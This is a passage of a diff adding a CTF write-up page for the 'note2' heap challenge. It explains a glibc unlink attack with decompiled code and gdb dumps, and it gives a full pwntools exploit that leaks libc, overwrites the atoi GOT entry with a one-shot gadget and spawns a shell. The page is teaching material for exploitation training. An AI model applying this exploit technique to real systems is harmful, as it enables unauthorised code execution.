+  puts(&quot;Input your address:&quot;);
+  callRead(&amp;address,0x60,10);
+LAB_0040101c:
+  uVar1 = printMenu();
+  switch(uVar1) {
+  case 1:
+    allocateChunk();
+    goto LAB_0040101c;
+  case 2:
+    showChunk();
+    goto LAB_0040101c;
+  case 3:
+    editChunk();
+    goto LAB_0040101c;
+  case 4:
+    freeChunk();
+    goto LAB_0040101c;
+  case 5:
+    break;
+  case 6:
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  puts(&quot;Bye~&quot;);
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+</code></pre>
+<p>So we can see, it prompts us to scan in a name and an address (which correlate to the bss addresses <code>0x6020e0</code> and <code>0x602180</code>). Let's take a look at the <code>allocateChunk</code> function:</p>
+<pre><code>void allocateChunk(void)
+
+{
+  uint size;
+  void *ptr;
+  ulong uVar1;
+ 
+  if (count &lt; 4) {
+    puts(&quot;Input the length of the note content:(less than 128)&quot;);
+    size = getInt();
+    if (size &lt; 0x81) {
+      ptr = malloc((ulong)size);
+      puts(&quot;Input the note content:&quot;);
+      callRead(ptr,(ulong)size,10,(ulong)size);
+      FUN_00400b10(ptr);
+      *(void **)(&amp;pointers + (ulong)count * 8) = ptr;
+      *(ulong *)(&amp;sizes + (ulong)count * 8) = (ulong)size;
+      uVar1 = (ulong)count;
+      count = count + 1;
+      printf(&quot;note add success, the id is %d\n&quot;,uVar1);
+    }
+    else {
+      puts(&quot;Too long&quot;);
+    }
+  }
+  else {
+    puts(&quot;note lists are full&quot;);
+  }
+  return;
+}
+</code></pre>
+<p>So we can see that we get to specify the size of the chunk that is malloced, however it can't be greater than <code>0x81</code> bytes. After that It will allow us to scan in data into that buffer. After that it will save the pointer to the malloced chunk in the array <code>pointers</code> (stored in the bss address <code>0x602120</code>). It also stores the size of the chunk in the bss array <code>sizes</code> at <code>0x602140</code>. We also see that it keeps a count of how many chunks have been allocated with the bss integer <code>count</code> at <code>0x602160</code> (and we can only allocate <code>4</code> chunks). Also through trial and error, we see that with this we get a heap overflow bug. Next we take a look at the <code>showChunk</code> function:</p>
+<pre><code>void showChunk(void)
+
+{
+  int iVar1;
+ 
+  puts(&quot;Input the id of the note:&quot;);
+  iVar1 = getInt();
+  if (((-1 &lt; iVar1) &amp;&amp; (iVar1 &lt; 4)) &amp;&amp; (*(long *)(&amp;pointers + (long)iVar1 * 8) != 0)) {
+    printf(&quot;Content is %s\n&quot;,*(undefined8 *)(&amp;pointers + (long)iVar1 * 8));
+  }
+  return;
+}
+</code></pre>
+<p>So we can see here, it prompts us for an index for the <code>pointers</code> array. If it passed a check, it will print the contents of the chunk using <code>printf</code>. Next up we have the <code>editChunk</code> function:</p>
+<pre><code>void editChunk(void)
+
+{
+  char *__src;
+  long lVar1;
+  undefined8 *puVar2;
+  int iVar3;
+  size_t sVar4;
+  long in_FS_OFFSET;
+  char local_100 [128];
+  undefined8 *local_80;
+  long canary;
+ 
+  canary = *(long *)(in_FS_OFFSET + 0x28);
+  if (count == 0) {
+    puts(&quot;Please add a note!&quot;);
+  }
+  else {
+    puts(&quot;Input the id of the note:&quot;);
+    iVar3 = getInt();
+    if ((-1 &lt; iVar3) &amp;&amp; (iVar3 &lt; 4)) {
+      __src = *(char **)(&amp;pointers + (long)iVar3 * 8);
+      lVar1 = *(long *)(&amp;sizes + (long)iVar3 * 8);
+      if (__src == (char *)0x0) {
+        puts(&quot;note has been deleted&quot;);
+      }
+      else {
+        puts(&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;);
+        iVar3 = getInt();
+        if ((iVar3 == 1) || (iVar3 == 2)) {
+          if (iVar3 == 1) {
+            local_100[0] = '\0';
+          }
+          else {
+            strcpy(local_100,__src);
+          }
+          local_80 = (undefined8 *)malloc(0xa0);
+          *local_80 = 0x6f4377654e656854;
+          local_80[1] = 0x3a73746e65746e;
+          printf((char *)local_80);
+          callRead((long)local_80 + 0xf,0x90,10);
+          FUN_00400b10((long)local_80 + 0xf);
+          puVar2 = local_80;
+          sVar4 = strlen(local_100);
+          *(undefined *)((lVar1 - sVar4) + 0xe + (long)puVar2) = 0;
+          strncat(local_100,(char *)((long)local_80 + 0xf),0xffffffffffffffff);
+          strcpy(__src,local_100);
+          free(local_80);
+          puts(&quot;Edit note success!&quot;);
+        }
+        else {
+          puts(&quot;Error choice!&quot;);
+        }
+      }
+    }
+  }
+  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
+    return;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+</code></pre>
+<p>With this function, I didn't really reverse it. Through trial and error, I see that it allows us to edit chunks. I also noticed that there appears to be another bug in this function, however with everything else I didn't need it to get a shell (I was a bit tired from work when I solved this challenge). Next up we have the <code>freeChunk</code> function.</p>
+<pre><code>void freeChunk(void)
+
+{
+  int iVar1;
+ 
+  puts(&quot;Input the id of the note:&quot;);
+  iVar1 = getInt();
+  if (((-1 &lt; iVar1) &amp;&amp; (iVar1 &lt; 4)) &amp;&amp; (*(long *)(&amp;pointers + (long)iVar1 * 8) != 0)) {
+    free(*(void **)(&amp;pointers + (long)iVar1 * 8));
+    *(undefined8 *)(&amp;pointers + (long)iVar1 * 8) = 0;
+    *(undefined8 *)(&amp;sizes + (long)iVar1 * 8) = 0;
+    puts(&quot;delete note success!&quot;);
+  }
+  return;
+}
+</code></pre>
+<p>So we can see, it prompts us for a chunk index and checks it. If it passes that check, then it will free the chunk. It will also zero out the pointer and the size, so no use after free. Also freeing a chunk doesn't decrement <code>count</code>, so we only get four chunks.</p>
+<h2><a class="header" href="#exploitation" id="exploitation">Exploitation</a></h2>
+<p>So we have a heap overflow bug, the ability to allocate four chunks, free them and view their contents. Also there is an array which stores all of the heap pointers at <code>0x602120</code> (no PIE so that address doesn't change). The first step of our exploit will be a heap unlink attack.</p>
+<h3><a class="header" href="#heap-unlink" id="heap-unlink">Heap Unlink</a></h3>
+<p>So we will be doing a heap unlink attack. The goal of this will be to write a pointer to a little bit before <code>pointers</code> (bss <code>0x602120</code>) to the array. That way we can just reference that pointer to edit pointers, and we will effectively be able to read and write what we want to/from memory. This next part explains how a heap unlink attack works, and is pretty similar to the other writeup in this module (feel free to skip these next few parts explanning):</p>
+<p>So for our exploitation process, we will be doing an unlink attack (which is viable on older libc versions, think pre-tcache). Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons). What this attack will do is give us a write. However there are a lot of restrictions on what we can write and where we can write. Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out. This is the write that we get. Let's take a look at the code in <code>malloc.c</code> to get a bit of an idea:</p>
+<pre><code>/* Take a chunk off a bin list.  */
+static void
+unlink_chunk (mstate av, mchunkptr p)
+{
+  if (chunksize (p) != prev_size (next_chunk (p)))
+    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);
+  mchunkptr fd = p-&gt;fd;
+  mchunkptr bk = p-&gt;bk;
+  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
+    malloc_printerr (&quot;corrupted double-linked list&quot;);
+  fd-&gt;bk = bk;
+  bk-&gt;fd = fd;
+if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)
+</code></pre>
+<p>So we can see here, what it does is it takes a chunk, and performs some checks on it. If the chunk passess all of the checks, it will write the pointers with <code>fd-&gt;bk = bk</code>, <code>bk-&gt;fd = fd</code>. There are essentially three checks that we need to worry about which we will set up a fake chunk for it. In order for this to work, we need a pointer to the malloc chunk which we will be making our fake chunk in stored somewhere we know. All of our heap chunks are stored in the bss starting at <code>0x602120</code> (remember no PIE) so we have that requirement met. Next up we will need to setup the fake chunk, which will contain <code>fwd</code> and <code>bk</code> pointers which on paper should point to the previous and next chunks in the list (since in the unlink the middle chunk gets removed, pointers to the <code>fwd</code> and <code>bk</code> chunks are written to each other to fill the gap in the list).</p>
+<p>So here is a bit of a representation of what's happening. Starting off here are our three chunks that will be a part of the unlink. They are linked via a doubly linked list with <code>fd</code> (forward) and <code>bk</code> (back) pointers. The only chunk we are actually going to write any data for will be the middle chunk. For this we will allocate two chunks (actual chunks allocated with malloc). These two chunks will need to be stored adjacent in memory (so we can use one to overflow the other). In the first one we will store the fake chunk, and also use it to overflow into the metadata of the second chunk. Then by freeing the second chunk it will trigger the unlink. The second chunk will not store any part of these three chunks.:</p>
+<pre><code>+----------------+    +----------------+    +----------------+
+| BK             |    | P (fake chunk) |    | FD             |
++----------------+    +----------------+    +----------------+
+| BK-&gt;fd         |    | P-&gt;fd          |    | FD-&gt;fd         |
++----------------+    +----------------+    +----------------+
+| BK-&gt;bk         |    | P-&gt;bk          |    | FD-&gt;bk         |
++----------------+    +----------------+    +----------------+
+</code></pre>
+<p>So in order to pass the unlink check for <code>if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</code>, the back pointer of the next chunk and the forward pointer of the previous chunk must be equal to the chunk address of our fake chunk. This is why we need a pointer to our heap chunk to be stored in an area of memory that we know and can read from. Since we have that in the PIE, this is fairly easy to set up. We just need to take the address that the pointer to our fake chunk is stored at, and subtract <code>0x18</code> from it to setup the <code>P-&gt;FD</code> pointer. The first <code>0x10</code> bytes of the <code>0x18</code> is because there are two QWORDS taken up for the heap metadata (like with a lot of heap chunks). The last <code>0x8</code> bytes is because with the <code>FD</code> chunk, we are worried about the <code>FD-&gt;bk</code> pointer not the <code>FD-&gt;fd</code> and the <code>FD-&gt;fd</code> takes up the first eight bytes of the chunk (so we need to shift it back by eight bytes to get the pointer in the right spot). Coincidentally we need to subtract <code>0x10</code> bytes from the pointer to our fake heap chunk for our <code>P-&gt;bk</code>, since with that chunk we are worried about the <code>fwd</code> pointer which is before the back pointer. The values for <code>FD-fd </code> and <code>BK-&gt;bk </code> don't matter too much in this case:</p>
+<pre><code>+----------------+    +----------------+    +----------------+
+| BK             |    | P (fake chunk) |    | FD             |
++----------------+    +----------------+    +----------------+
+| BK-fd -&gt; P     |    | P-fd  -&gt; FD    |    | FD-fd  -&gt; null |
++----------------+    +----------------+    +----------------+
+| BK-&gt;bk -&gt; null |    | P-&gt;bk -&gt; BK    |  | FD-&gt;bk -&gt; P    |
++----------------+    +----------------+    +----------------+
+</code></pre>
+<p>There are two more checks we need to worry about. The first is the size check of our fake chunk, which we will cover in a bit when we talk about how exactly we are going to overflow the heap metadata. The third check consists of the <code>p-&gt;fd_nextsize != NULL</code>. If we can set <code>p-&gt;fd_nextsize</code> equal to null, that means we will be able to skip most other checks which will save us a lot of time and hassle. Looking at the source code in <code>malloc.c</code> (https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#_int_free) we can see it is stored right after the <code>bk</code> pointer:</p>
+<pre><code>struct malloc_chunk {
+  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+</code></pre>
+<p>So in order to hit that check that way we want, we just need to set the next QWORD after <code>bk</code> to be <code>0x0</code>.</p>
+<p>After that, we will free the second chunk (second chunk that we allocated) which will trigger the unlink, and write a pointer to <code>BK-fd</code> and <code>FD-&gt;bk</code>. In this case it will be a pointer to the fake <code>FD</code> chunk, since they will both be writing it to the same location in memory, however that pointer gets written last.</p>
+<pre><code>+----------------+    +----------------+
+| BK             |    | FD             |
++----------------+    +----------------+
+| BK-fd -&gt; FD    |    | FD-fd  -&gt; null |
++----------------+    +----------------+
+| BK-&gt;bk -&gt; null |    | FD-&gt;bk -&gt; BK   |
++----------------+    +----------------+
+</code></pre>
+<p>Let's talk about how we will be overflowing the heap metadata and constructing the fake chunk. For this we will allocate three chunks. The first will hold our fake chunk for the unlink. The second chunk we will use to overflow the metadata of the third chunk. The third chunk will be the one which we overwrite the heap metadata to point to the fake chunk, and we free it. For the bug I used, I noticed that we can't use any null bytes (except the one at the end of the string) which we need for the fake chunk. That is why I have the second chunk, so I can overwrite the third chunk's metadata while still keeping the chunk intact. Let's take a look at the memory being corrupted. We start off with our three chunks:</p>
+<pre><code>gef➤  x/4g 0x602120
+0x602120:    0x25f5010    0x25f50a0
+0x602130:    0x25f50c0    0x0
+gef➤  x/50g 0x25f5000
+0x25f5000:    0x0    0x91
+0x25f5010:    0x0    0xa0
+0x25f5020:    0x602108    0x602110
+0x25f5030:    0x0    0x0
+0x25f5040:    0x0    0x0
+0x25f5050:    0x0    0x0
+0x25f5060:    0x0    0x0
+0x25f5070:    0x0    0x0
+0x25f5080:    0x31    0x0
+0x25f5090:    0x0    0x21
+0x25f50a0:    0x3131313131313131    0x31
+0x25f50b0:    0x0    0x91
+0x25f50c0:    0x3232323232323232    0x3232323232323232
+0x25f50d0:    0x3232323232323232    0x3232323232323232
+0x25f50e0:    0x3232323232323232    0x3232323232323232
+0x25f50f0:    0x3232323232323232    0x3232323232323232
+0x25f5100:    0x3232323232323232    0x3232323232323232
+0x25f5110:    0x3232323232323232    0x3232323232323232
+0x25f5120:    0x3232323232323232    0x3232323232323232
+0x25f5130:    0x3232323232323232    0x32323232323232
+0x25f5140:    0x0    0x20ec1
+0x25f5150:    0x0    0x0
+0x25f5160:    0x0    0x0
+0x25f5170:    0x0    0x0
+0x25f5180:    0x0    0x0
+</code></pre>
+<p>So we can see our fake chunk at <code>0x25f5010</code>. We will now free the <code>0x25f50a0</code> chunk, and reallocate it to overflow the third chunks metadata. We will set the previous size to <code>0xa0</code> to point to our fake chunk, and clear out the previous in use bit:</p>
+<pre><code>gef➤  x/4g 0x602120
+0x602120:    0x25f5010    0x0
+0x602130:    0x25f50c0    0x25f50a0
+gef➤  x/50g 0x25f5000
+0x25f5000:    0x0    0x91
+0x25f5010:    0x0    0xa0
+0x25f5020:    0x602108    0x602110
+0x25f5030:    0x0    0x0
+0x25f5040:    0x0    0x0
+0x25f5050:    0x0    0x0
+0x25f5060:    0x0    0x0
+0x25f5070:    0x0    0x0
+0x25f5080:    0x31    0x0
+0x25f5090:    0x0    0x21
+0x25f50a0:    0x3535353535353535    0x3535353535353535
+0x25f50b0:    0xa0    0x90
+0x25f50c0:    0x3232323232320031    0x3232323232323232
+0x25f50d0:    0x3232323232323232    0x3232323232323232
+0x25f50e0:    0x3232323232323232    0x3232323232323232
+0x25f50f0:    0x3232323232323232    0x3232323232323232
+0x25f5100:    0x3232323232323232    0x3232323232323232
+0x25f5110:    0x3232323232323232    0x3232323232323232
+0x25f5120:    0x3232323232323232    0x3232323232323232
+0x25f5130:    0x3232323232323232    0x32323232323232
+0x25f5140:    0x0    0x20ec1
+0x25f5150:    0x0    0x0
+0x25f5160:    0x0    0x0
+0x25f5170:    0x0    0x0
+0x25f5180:    0x0    0x0
+</code></pre>
+<p>So now when we free the third chunk, it will think that the previous chunk is freed and it starts at <code>0x25f50b0 - 0xa0 = 0x25f5010</code>. Since we setup our fake chunk to pass the checks, it will unlink our chunk and write the address of <code>P-&gt;fd</code> (<code>0x602120 - 0x18 = 0x602108</code>) to <code>0x602120</code>:</p>
+<pre><code>gef➤  x/4g 0x602120
+0x602120:    0x602108    0x0
+0x602130:    0x0    0x25f50a0
+gef➤  x/50g 0x25f5000
+0x25f5000:    0x0    0x91
+0x25f5010:    0x0    0x20ff1
+0x25f5020:    0x602108    0x602110
+0x25f5030:    0x0    0x0
+0x25f5040:    0x0    0x0
+0x25f5050:    0x0    0x0
+0x25f5060:    0x0    0x0
+0x25f5070:    0x0    0x0
+0x25f5080:    0x31    0x0
+0x25f5090:    0x0    0x21
+0x25f50a0:    0x3535353535353535    0x3535353535353535
+0x25f50b0:    0xa0    0x90
+0x25f50c0:    0x3232323232320031    0x3232323232323232
+0x25f50d0:    0x3232323232323232    0x3232323232323232
+0x25f50e0:    0x3232323232323232    0x3232323232323232
+0x25f50f0:    0x3232323232323232    0x3232323232323232
+0x25f5100:    0x3232323232323232    0x3232323232323232
+0x25f5110:    0x3232323232323232    0x3232323232323232
+0x25f5120:    0x3232323232323232    0x3232323232323232
+0x25f5130:    0x3232323232323232    0x32323232323232
+0x25f5140:    0x0    0x20ec1
+0x25f5150:    0x0    0x0
+0x25f5160:    0x0    0x0
+0x25f5170:    0x0    0x0
+0x25f5180:    0x0    0x0
+</code></pre>
+<p>Just like that, the unlink was a success. Now we can use the pointer at <code>0x602120</code> to edit the array itself and overwrite pointers, than write to or print the data pointed to by those pointers. For this I wrote the got address of <code>atoi</code> to <code>0x602120</code>, and printed it for a libc infoleak:</p>
+<pre><code>gef➤  x/4g 0x602120
+0x602120:    0x602088    0x0
+0x602130:    0x0    0x25f50a0
+gef➤  x/g 0x602088
+0x602088 &lt;atoi@got.plt&gt;:    0x7f1df5482e80
+</code></pre>
+<p>After that, we can just write a oneshot gadget to <code>atoi</code>, and when it gets called (which it does throughout the program) we will get a shell. I choose this one since the first few I tried didn't work for some reason (too tired from work to debug it, so I just tried a few other functions).</p>
+<h2><a class="header" href="#exploit" id="exploit">Exploit</a></h2>
+<p>Putting it all together, we get the following exploit. This exploit was ran on Ubuntu 16.04:</p>
+<pre><code>from pwn import *
+
+# Establish the target process, binary, and libc
+target = process(&quot;./note2&quot;, env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;})
+elf = ELF('note2')
+libc = ELF('libc-2.23.so')
+
+# You were expecting a comment, BUT IT WAS ME DIO!
+#gdb.attach(target)
+
+# Establish our io functions
+def addNote(content, size):
+    print target.recvuntil(&quot;option---&gt;&gt;&quot;)
+    target.sendline(&quot;1&quot;)
+    print target.recvuntil(&quot;(less than 128)&quot;)
+    target.sendline(str(size))
+    print target.recvuntil(&quot;content:&quot;)
+    target.send(content)
+
+def editNote(index, content, app):
+    print target.recvuntil(&quot;option---&gt;&gt;&quot;)
+    target.sendline(&quot;3&quot;)
+    print target.recvuntil(&quot;note:&quot;)
+    target.sendline(str(index))
+    print target.recvuntil(&quot;2.append]&quot;)
+    target.sendline(str(app))
+    print target.recvuntil(&quot;TheNewContents:&quot;)
+    target.sendline(content)
+
+def deleteNote(index):
+    print target.recvuntil(&quot;option---&gt;&gt;&quot;)
+    target.sendline(&quot;4&quot;)
+    print target.recvuntil(&quot;note:&quot;)
+    target.sendline(str(index))
+
+def showNote(index):
+    print target.recvuntil(&quot;option---&gt;&gt;&quot;)
+    target.sendline(&quot;2&quot;)
+    print target.recvuntil(&quot;note:&quot;)
+    target.sendline(&quot;0&quot;)
+    print target.recvuntil(&quot;Content is &quot;)
+    leak = target.recvline().strip(&quot;\x0a&quot;)
+    leak = u64(leak + &quot;\x00&quot;*(8-len(leak)))
+    return leak
+
+# Send data for the address / name
+# For our exploit, this really doesn't matter (much like Aqua)
+target.sendline(&quot;15935728&quot;)
+target.sendline(&quot;15935728&quot;)
+
+
+ptr = 0x602120
+
+fakeChunk = &quot;&quot;
+
+fakeChunk += p64(0x0)            # Previous Size
+fakeChunk += p64(0xa0)            # Size
+fakeChunk += p64(ptr - (0x8*3))        # FD ptr
+fakeChunk += p64(ptr - (0x8*2))        # BK ptr
+fakeChunk += p64(0x0)            # FD Next Size
+
+# Allocate the heap chunk and store the fake chunk
+addNote(fakeChunk, 0x80)
+
+# For me, IO For this challenge was a bit weird. I needed to insert lines like these in order
+# for the input the happen properly.
+target.sendline(&quot;1&quot;)
+
+# Add the second chunk, which will free and reallocate for the overflow
+addNote(&quot;1&quot;*0x8, 00)
+target.sendline(&quot;1&quot;)
+
+# This is the third chunk which we will overflow it's heap metadata to point to the fake chunk as a freed previous chunk
+addNote(&quot;2&quot;*0x80, 0x80)
+target.sendline(&quot;1&quot;)
+
+# Free the second chunk, reallocate it and overflow the heap metatda's previous size and size
+deleteNote(1)
+
+addNote(&quot;5&quot;*0x10 + p64(0xa0) + p64(0x90), 0)
+target.sendline(&quot;1&quot;)
+
+
+# Free the third chunk (with the overwritten heap metadata) to execute the unlink
+deleteNote(2)
+
+# Now that the unlink happened, write the got entry address for atoi to the heap pointers array
+editNote(0, &quot;6&quot;*24 + p64(elf.got['atoi']), 1)
+
+# Leak the libc address of atoi, calculate our oneshot gadget address
+leak = showNote(0)
+libcBase = leak - libc.symbols['atoi']
+oneShot = libcBase + 0xf02a4
+
+print &quot;libc base: &quot; + hex(libcBase)
+print &quot;oneshot gadget: &quot; + hex(oneShot)
+
+# Write over the got entry for atoi with the oneshot gadget
+editNote(0, p64(oneShot), 1)
+
+# Send the string &quot;1&quot; to call atoi, call our oneshot gadget and get a shell
+target.sendline(&quot;1&quot;)
+
+target.interactive()
+</code></pre>
+<p>When we run it:</p>
+<pre><code>$    python exploit.py
+[+] Starting local process './note2': pid 4270
+[*] '/home/guyinatuxedo/Desktop/zctf/note2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/home/guyinatuxedo/Desktop/zctf/libc-2.23.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+Input your name:
+Input your address:
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the length of the note content:(less than 128)
+
+Input the note content:
+
+note add success, the id is 0
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the length of the note content:(less than 128)
+
+Input the note content:
+
+note add success, the id is 1
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the length of the note content:(less than 128)
+
+Input the note content:
+
+note add success, the id is 2
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+Input the id of the note:
+
+delete note success!
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the length of the note content:(less than 128)
+
+Input the note content:
+
+note add success, the id is 3
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the id of the note:
+
+delete note success!
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the id of the note:
+
+do you want to overwrite or append?[1.overwrite/2.append]
+
+TheNewContents:
+Edit note success!
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the id of the note:
+
+Content is
+libc base: 0x7fa5eca52000
+oneshot gadget: 0x7fa5ecb422a4
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+
+Input the id of the note:
+
+do you want to overwrite or append?[1.overwrite/2.append]
+
+TheNewContents:
+[*] Switching to interactive mode
+Edit note success!
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+$ w
+ 22:20:38 up  1:45,  1 user,  load average: 0.40, 0.38, 0.22
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+guyinatu tty7     :0               20:35    1:45m  1:06   0.19s /sbin/upstart --user
+$ ls
+core  exploit.py  libc-2.19.so    libc-2.23.so  note2
+</code></pre>
+<p>Just like that, we popped a shell!</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="../../30-unlink/hitcon14_stkof/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+                            <a rel="next" href="../../26-heap_grooming/explanation_heap_grooming/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a href="../../30-unlink/hitcon14_stkof/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a href="../../26-heap_grooming/explanation_heap_grooming/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+            </nav>
+
+        </div>
+
+        
+
+        
+
+        
+        
+        
+        <script type="text/javascript">
+            window.playpen_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+
+    </body>
+</html>
